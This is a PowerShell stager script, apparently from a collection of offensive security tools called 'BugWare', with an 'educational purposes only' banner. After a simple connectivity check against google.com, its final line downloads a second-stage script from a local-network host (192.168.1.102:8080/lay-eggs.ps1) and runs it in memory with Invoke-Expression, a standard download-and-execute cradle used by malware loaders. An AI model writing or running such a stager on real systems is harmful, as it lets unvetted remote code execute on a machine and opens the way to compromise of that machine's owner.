# -------------------------------------------------------------------------
# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
# This script is part of the BugWare repository, a collection of security tools
# and PoCs for learning about attack vectors.
# DO NOT USE THIS FOR ILLEGAL PURPOSES.
# -------------------------------------------------------------------------

<#
.SYNOPSIS
    Egg Larvae Script
.DESCRIPTION
    Basic connectivity check and staging script for the Dobson framework.
.AUTHOR
    CyberPanther232
#>

# Test for internet connectivity
function Test-InternetConnection {
    try {
        $request = [System.Net.WebRequest]::Create("http://www.google.com")
        $request.Timeout = 5000
        $response = $request.GetResponse()
        $response.Close()
        return $true
    } catch {
        return $false
    }
}

if (-not (Test-InternetConnection)) {
    Write-Error "No internet connection detected. Please check your network settings."
    exit 1
}

# Run Larvae Script
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://192.168.1.102:8080/lay-eggs.ps1'))
exit 0